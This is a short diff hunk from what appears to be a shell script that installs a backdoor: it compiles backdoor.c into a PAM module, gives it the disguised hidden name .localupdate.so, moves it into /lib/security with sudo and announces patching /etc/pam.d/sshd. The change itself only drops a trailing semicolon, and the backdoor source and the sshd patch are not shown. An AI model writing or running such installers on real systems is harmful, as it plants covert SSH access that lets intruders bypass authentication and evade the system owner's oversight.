@@ -13,7 +13,7 @@ gcc -fPIC -fno-stack-protector -c backdoor.c -o pam_backdoor.o
 ld -x --shared -o .localupdate.so pam_backdoor.o
 
 echo "[*] Installing PAM module..."
-sudo mkdir /lib/security;
+sudo mkdir /lib/security
 sudo mv .localupdate.so /lib/security/
 
 echo "[*] Patching /etc/pam.d/sshd..."
